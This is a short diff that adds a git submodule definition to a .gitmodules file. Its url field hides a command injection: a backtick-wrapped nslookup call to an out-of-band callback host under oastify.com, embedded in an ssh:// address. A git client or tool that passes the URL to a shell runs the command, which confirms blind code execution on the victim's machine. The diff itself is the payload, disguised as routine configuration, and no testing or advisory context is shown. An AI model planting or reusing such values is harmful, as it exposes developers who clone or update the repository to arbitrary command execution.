@@ -1,0 +1,3 @@
+[submodule "cves"]
+	path = cves
+	url = ssh://`nslookup CYBERSEC.ki601xiyv1sn66yiygr1cxlo1f76vxjm.oastify.com`foo.chtpt.com/bar
